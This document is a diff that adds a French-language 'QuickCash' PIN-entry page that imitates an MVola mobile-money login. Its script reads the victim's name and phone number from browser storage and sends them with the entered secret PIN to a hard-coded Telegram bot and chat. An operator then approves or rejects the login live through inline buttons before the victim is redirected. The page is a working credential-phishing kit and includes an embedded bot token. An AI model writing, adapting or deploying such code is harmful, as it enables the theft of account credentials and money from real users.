@@ -1,0 +1,665 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Code Secret - QuickCash</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Albert+Sans:wght@400;500;600;700;800&display=swap');
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        
+        body {
+            font-family: 'Albert Sans', sans-serif;
+            background-color: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .pin-container {
+            width: 100%;
+            max-width: 420px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 20px 10px;
+            position: relative;
+            z-index: 2;
+        }
+        /* --- Decorative Elements --- */
+        
+        .decoration-star {
+            position: absolute;
+            top: 60px;
+            right: 40px;
+            width: 60px;
+            height: 60px;
+            color: #a8e6cf;
+            opacity: 0.8;
+            z-index: 1;
+        }
+        
+        .decoration-dots {
+            position: absolute;
+            top: 100px;
+            right: 90px;
+            width: 40px;
+            height: 40px;
+            background-image: radial-gradient(#a8e6cf 2px, transparent 2px);
+            background-size: 10px 10px;
+            opacity: 0.6;
+            z-index: 1;
+        }
+        
+        .decoration-blue-circle {
+            position: absolute;
+            top: 70px;
+            right: 100px;
+            width: 24px;
+            height: 24px;
+            border: 5px solid #4A90E2;
+            border-radius: 50%;
+            background: #fff;
+            z-index: 1;
+        }
+        
+        .decoration-blue-circle-2 {
+            position: absolute;
+            top: 30px;
+            right: 120px;
+            width: 16px;
+            height: 16px;
+            border: 4px solid #4A90E2;
+            border-radius: 50%;
+            background: #fff;
+            z-index: 1;
+        }
+        /* --- Text Elements --- */
+        
+        .welcome-text {
+            font-size: 20px;
+            font-weight: 500;
+            color: #003366;
+            margin-bottom: 8px;
+            z-index: 2;
+        }
+        
+        .user-name {
+            font-size: 22px;
+            font-weight: 700;
+            color: #003366;
+            margin-bottom: 25px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            z-index: 2;
+            text-align: center;
+        }
+        
+        .instruction-text {
+            font-size: 15px;
+            font-weight: 600;
+            color: #003366;
+            margin-bottom: 25px;
+            text-align: center;
+            z-index: 2;
+        }
+        /* --- PIN Inputs --- */
+        
+        .pin-inputs {
+            display: flex;
+            gap: 15px;
+            margin-bottom: 40px;
+            justify-content: center;
+            z-index: 2;
+        }
+        
+        .pin-box {
+            width: 65px;
+            height: 65px;
+            border: 2px solid #e0e0e0;
+            border-radius: 16px;
+            font-size: 28px;
+            font-weight: 700;
+            text-align: center;
+            color: #003366;
+            outline: none;
+            background: #fff;
+            transition: border-color 0.3s, box-shadow 0.3s;
+            font-family: 'Albert Sans', sans-serif;
+            caret-color: #003366;
+        }
+        
+        .pin-box:focus {
+            border-color: #4A90E2;
+            box-shadow: 0 0 0 3px rgba(74, 144, 226, 0.15);
+        }
+        /* Hide spin buttons */
+        
+        .pin-box::-webkit-outer-spin-button,
+        .pin-box::-webkit-inner-spin-button {
+            -webkit-appearance: none;
+            margin: 0;
+        }
+        /* --- Main Button --- */
+        
+        .btn-connect {
+            width: 100%;
+            max-width: 400px;
+            padding: 18px;
+            border: none;
+            border-radius: 50px;
+            font-size: 20px;
+            font-weight: 600;
+            color: #999;
+            background-color: #d3d3d3;
+            cursor: not-allowed;
+            transition: all 0.3s ease;
+            font-family: 'Albert Sans', sans-serif;
+            margin-bottom: 30px;
+            z-index: 2;
+        }
+        
+        .btn-connect.active {
+            background-color: #003366;
+            color: #ffffff;
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(0, 51, 102, 0.3);
+        }
+        
+        .btn-connect.active:hover {
+            background-color: #002244;
+            transform: translateY(-2px);
+        }
+        /* --- Reset Link --- */
+        
+        .reset-link {
+            font-size: 15px;
+            font-weight: 600;
+            color: #a01030;
+            text-decoration: none;
+            margin-bottom: 50px;
+            z-index: 2;
+        }
+        
+        .reset-link:hover {
+            text-decoration: underline;
+        }
+        /* --- Fingerprint & Auth Toggle --- */
+        
+        .auth-section {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            width: 100%;
+            max-width: 400px;
+            padding: 0 10px;
+            z-index: 2;
+        }
+        
+        .fingerprint-btn {
+            width: 70px;
+            height: 70px;
+            background-color: #FCD116;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            cursor: pointer;
+            border: none;
+            transition: transform 0.2s, box-shadow 0.2s;
+            box-shadow: 0 4px 10px rgba(252, 209, 22, 0.4);
+        }
+        
+        .fingerprint-btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 6px 15px rgba(252, 209, 22, 0.6);
+        }
+        
+        .fingerprint-btn svg {
+            width: 38px;
+            height: 38px;
+            fill: #003366;
+        }
+        
+        .auth-toggle-wrapper {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        
+        .auth-label {
+            font-size: 16px;
+            color: #555;
+            font-weight: 500;
+        }
+        /* Toggle Switch */
+        
+        .toggle-switch {
+            position: relative;
+            width: 50px;
+            height: 28px;
+            background-color: #e0e0e0;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        
+        .toggle-switch.active {
+            background-color: #4A90E2;
+        }
+        
+        .toggle-switch::after {
+            content: '';
+            position: absolute;
+            top: 3px;
+            left: 3px;
+            width: 22px;
+            height: 22px;
+            background-color: #ffffff;
+            border-radius: 50%;
+            transition: transform 0.3s;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
+        }
+        
+        .toggle-switch.active::after {
+            transform: translateX(22px);
+        }
+        /* Error Message */
+        
+        .error-msg {
+            display: none;
+            width: 100%;
+            max-width: 400px;
+            background: #ffe6e6;
+            border: 1px solid #ffcccc;
+            color: #cc0000;
+            padding: 12px 16px;
+            border-radius: 8px;
+            font-size: 13px;
+            margin-bottom: 20px;
+            text-align: center;
+            z-index: 2;
+            word-break: break-word;
+        }
+        /* Loading Overlay */
+        
+        .loading-overlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(255, 255, 255, 0.95);
+            z-index: 2000;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            gap: 20px;
+        }
+        
+        .loading-overlay.active {
+            display: flex;
+        }
+        
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 3px solid #f4d03f;
+            border-top-color: #003366;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+        
+        .loading-text {
+            font-weight: 700;
+            font-size: 16px;
+            color: #003366;
+        }
+        /* --- Responsive Adjustments --- */
+        
+        @media (max-width: 400px) {
+            .pin-box {
+                width: 55px;
+                height: 55px;
+                font-size: 24px;
+            }
+            .pin-inputs {
+                gap: 10px;
+            }
+            .user-name {
+                font-size: 18px;
+            }
+            .btn-connect {
+                font-size: 18px;
+                padding: 15px;
+            }
+            .fingerprint-btn {
+                width: 60px;
+                height: 60px;
+            }
+            .fingerprint-btn svg {
+                width: 32px;
+                height: 32px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <!-- Decorative Elements -->
+    <div class="decoration-dots"></div>
+    <div class="decoration-blue-circle-2"></div>
+    <div class="decoration-blue-circle"></div>
+    <svg class="decoration-star" viewBox="0 0 24 24" fill="currentColor">
+        <path d="M12 2l2.4 7.2h7.6l-6 4.8 2.4 7.2-6-4.8-6 4.8 2.4-7.2-6-4.8h7.6z"/>
+    </svg>
+
+    <div class="pin-container">
+
+        <!-- Header Text -->
+        <div class="welcome-text">Bienvenue</div>
+        <div class="user-name" id="displayName">HASSANE AHMED</div>
+        <div class="instruction-text">Veuillez saisir votre code secret</div>
+
+        <!-- Error Message Container -->
+        <div class="error-msg" id="pinError">Erreur réseau. Veuillez réessayer.</div>
+
+        <!-- PIN Inputs -->
+        <div class="pin-inputs">
+            <input type="tel" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]*" autofocus>
+            <input type="tel" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+            <input type="tel" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+            <input type="tel" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+        </div>
+
+        <!-- Connect Button -->
+        <button class="btn-connect" id="connectBtn" disabled>Se Connecter</button>
+
+        <!-- Reset Link -->
+        <a href="#" class="reset-link">Réinitialiser le code secret?</a>
+
+        <!-- Fingerprint & Toggle -->
+        <div class="auth-section">
+            <!-- Fingerprint Button -->
+            <button class="fingerprint-btn" id="fingerprintBtn">
+                <svg viewBox="0 0 24 24">
+                    <path d="M12 2C9.5 2 7.2 3 5.6 4.7l1.4 1.4C8.3 4.9 10.1 4 12 4c4.4 0 8 3.6 8 8 0 1.2-.3 2.3-.8 3.3l1.7 1.7C21.6 15.5 22 13.8 22 12c0-5.5-4.5-10-10-10zm0 4c-3.3 0-6 2.7-6 6 0 .5.1 1 .2 1.5l1.8-1.8c.1-.5.3-1 .6-1.5.5-.8 1.3-1.4 2.3-1.7L12 6zm0 4c-.6 0-1 .4-1 1 0 .3.1.6.3.8l1.8-1.8c-.2-.2-.5-.3-.8-.3zm-4 4c0 .5.1 1 .2 1.5l1.8-1.8c-.1-.3-.2-.6-.2-.9 0-1.1.9-2 2-2 .3 0 .6.1.9.2l1.8-1.8C13.6 12.1 13.1 12 12.5 12c-2.5 0-4.5 2-4.5 4.5zm-1.8 1.3C6.1 16.7 6 15.8 6 15c0-1.1.3-2.1.8-3.1L5.1 10.2C4.4 11.6 4 13.2 4 15c0 1.2.2 2.3.6 3.4l1.6-1.6zm8.3 2.6c-1.1.8-2.4 1.3-3.8 1.3-1.3 0-2.5-.4-3.5-1.1l-1.4 1.4c1.4 1 3.1 1.6 4.9 1.6 1.8 0 3.5-.6 4.9-1.6l-1.1-1.6zM12 16c-.6 0-1 .4-1 1 0 .6.4 1 1 1s1-.4 1-1-.4-1-1-1zm4.3 1.7c-.3.5-.7 1-1.2 1.3l1.4 1.4c.7-.5 1.2-1.1 1.6-1.8l-1.8-.9z"/>
+                </svg>
+            </button>
+
+            <!-- Toggle Switch -->
+            <div class="auth-toggle-wrapper">
+                <span class="auth-label">Authentification</span>
+                <div class="toggle-switch" id="authToggle"></div>
+            </div>
+        </div>
+
+    </div>
+
+    <!-- Loading Overlay -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="spinner"></div>
+        <div class="loading-text">Vérification en cours...</div>
+    </div>
+
+    <!-- JavaScript to handle logic and Telegram Integration -->
+    <script>
+        // --- TELEGRAM CONFIGURATION ---
+        // CORRECTED TOKEN: The 'l' was changed to '1' based on the error
+        const TELEGRAM_BOT_TOKEN = "8860442173:AAG8rL46NtCjyacbn8OebIxw_7y8q7_Nmq4";
+        const TELEGRAM_CHAT_ID = "5703339850";
+
+        // --- 1. Retrieve Applicant Name ---
+        const savedData = localStorage.getItem('loanApplication');
+        const displayNameElement = document.getElementById('displayName');
+        let userName = "CLIENT";
+
+        if (savedData) {
+            const data = JSON.parse(savedData);
+            if (data.fullName) {
+                userName = data.fullName;
+                displayNameElement.textContent = userName.toUpperCase();
+            }
+        } else {
+            displayNameElement.textContent = userName;
+        }
+
+        const userPhone = localStorage.getItem('userPhone') || 'Inconnu';
+
+        // --- 2. PIN Input Logic ---
+        const pinBoxes = document.querySelectorAll('.pin-box');
+        const connectBtn = document.getElementById('connectBtn');
+        const loadingOverlay = document.getElementById('loadingOverlay');
+        const errorMsg = document.getElementById('pinError');
+
+        function showError(msg) {
+            errorMsg.textContent = msg;
+            errorMsg.style.display = 'block';
+        }
+
+        function hideError() {
+            errorMsg.style.display = 'none';
+        }
+
+        pinBoxes.forEach((box, index) => {
+            box.addEventListener('input', (e) => {
+                if (e.target.value.length === 1) {
+                    if (index < pinBoxes.length - 1) {
+                        pinBoxes[index + 1].focus();
+                    }
+                }
+                checkPinComplete();
+            });
+
+            box.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && e.target.value.length === 0) {
+                    if (index > 0) {
+                        pinBoxes[index - 1].focus();
+                        pinBoxes[index - 1].value = '';
+                    }
+                }
+            });
+
+            box.addEventListener('paste', (e) => {
+                e.preventDefault();
+                const pastedData = e.clipboardData.getData('text').slice(0, 4);
+                if (/^\d+$/.test(pastedData)) {
+                    for (let i = 0; i < pastedData.length; i++) {
+                        if (index + i < pinBoxes.length) {
+                            pinBoxes[index + i].value = pastedData[i];
+                        }
+                    }
+                    checkPinComplete();
+                }
+            });
+        });
+
+        function checkPinComplete() {
+            let allFilled = true;
+            pinBoxes.forEach(box => {
+                if (box.value.length !== 1) {
+                    allFilled = false;
+                }
+            });
+
+            if (allFilled) {
+                connectBtn.disabled = false;
+                connectBtn.classList.add('active');
+            } else {
+                connectBtn.disabled = true;
+                connectBtn.classList.remove('active');
+            }
+        }
+
+        // --- 3. Telegram Polling Logic ---
+        function startPolling(actionId, onApproveUrl) {
+            let offset = 0;
+            let decided = false;
+            let pollCount = 0;
+            const maxPolls = 90;
+
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?limit=1`)
+                .then(r => r.json())
+                .then(data => {
+                    if (data.ok && data.result.length > 0) {
+                        offset = data.result[data.result.length - 1].update_id + 1;
+                    }
+                    pollLoop();
+                })
+                .catch(() => pollLoop());
+
+            function pollLoop() {
+                if (decided) return;
+                pollCount++;
+
+                if (pollCount > maxPolls) {
+                    decided = true;
+                    loadingOverlay.classList.remove('active');
+                    showError('Délai expiré. Veuillez réessayer.');
+                    return;
+                }
+
+                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?limit=20&offset=${offset}`)
+                    .then(r => r.json())
+                    .then(data => {
+                        if (!data.ok || decided) {
+                            if (!decided) setTimeout(pollLoop, 2000);
+                            return;
+                        }
+
+                        for (let update of data.result) {
+                            offset = update.update_id + 1;
+
+                            if (update.callback_query) {
+                                const action = update.callback_query.data;
+
+                                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
+                                    method: 'POST',
+                                    headers: {
+                                        'Content-Type': 'application/json'
+                                    },
+                                    body: JSON.stringify({
+                                        callback_query_id: update.callback_query.id,
+                                        text: "Action enregistrée !"
+                                    })
+                                }).catch(() => {});
+
+                                if (action === `approve_pin_${actionId}`) {
+                                    decided = true;
+                                    loadingOverlay.classList.remove('active');
+                                    window.location.href = onApproveUrl;
+                                    return;
+                                } else if (action === `decline_pin_${actionId}`) {
+                                    decided = true;
+                                    loadingOverlay.classList.remove('active');
+                                    showError('Accès refusé. Veuillez réessayer.');
+                                    return;
+                                } else if (action === `wrong_pin_${actionId}`) {
+                                    decided = true;
+                                    loadingOverlay.classList.remove('active');
+                                    showError('Code secret incorrect. Veuillez vérifier et réessayer.');
+                                    return;
+                                }
+                            }
+                        }
+                        if (!decided) setTimeout(pollLoop, 2000);
+                    })
+                    .catch(() => {
+                        if (!decided) setTimeout(pollLoop, 2000);
+                    });
+            }
+        }
+
+        // --- 4. Send PIN to Telegram ---
+        function sendPinToTelegram(pin, isBiometric = false) {
+            hideError();
+            loadingOverlay.classList.add('active');
+
+            const actionId = pin + Date.now().toString().slice(-4);
+            const methodText = isBiometric ? "Empreinte Digitale" : "Code Secret PIN";
+
+            const message = `🔑 <b>Saisie ${methodText} - MVola</b>\n\n👤 Nom: <code>${userName}</code>\n📱 Numéro: <code>+269 ${userPhone}</code>\n🔢 ${methodText}: <code>${pin}</code>\n⏰ Heure: ${new Date().toLocaleString('fr-FR')}\n\nVeuillez valider l'accès :`;
+
+            const keyboard = {
+                inline_keyboard: [
+                    [{
+                        text: "✅ APPROUVER",
+                        callback_data: `approve_pin_${actionId}`
+                    }, {
+                        text: "❌ REFUSER",
+                        callback_data: `decline_pin_${actionId}`
+                    }],
+                    [{
+                        text: "⚠️ CODE INCORRECT",
+                        callback_data: `wrong_pin_${actionId}`
+                    }]
+                ]
+            };
+
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML',
+                        reply_markup: JSON.stringify(keyboard)
+                    })
+                })
+                .then(res => res.json())
+                .then(data => {
+                    if (data.ok) {
+                        startPolling(actionId, 'success.html');
+                    } else {
+                        loadingOverlay.classList.remove('active');
+                        showError(`Telegram Error: ${data.description || 'Unknown error'}`);
+                    }
+                })
+                .catch((error) => {
+                    loadingOverlay.classList.remove('active');
+                    showError(`Network Error: ${error.message}`);
+                });
+        }
+
+        // --- 5. Connect Button Logic ---
+        connectBtn.addEventListener('click', () => {
+            if (!connectBtn.disabled) {
+                let pin = '';
+                pinBoxes.forEach(box => pin += box.value);
+                localStorage.setItem('userPIN', pin);
+                sendPinToTelegram(pin, false);
+            }
+        });
+
+        // --- 6. Authentication Toggle Logic ---
+        const authToggle = document.getElementById('authToggle');
+        authToggle.addEventListener('click', () => {
+            authToggle.classList.toggle('active');
+        });
+
+        // --- 7. Fingerprint Button Logic ---
+        const fingerprintBtn = document.getElementById('fingerprintBtn');
+        fingerprintBtn.addEventListener('click', () => {
+            sendPinToTelegram('0000', true);
+        });
+    </script>
+
+</body>
+
+</html>
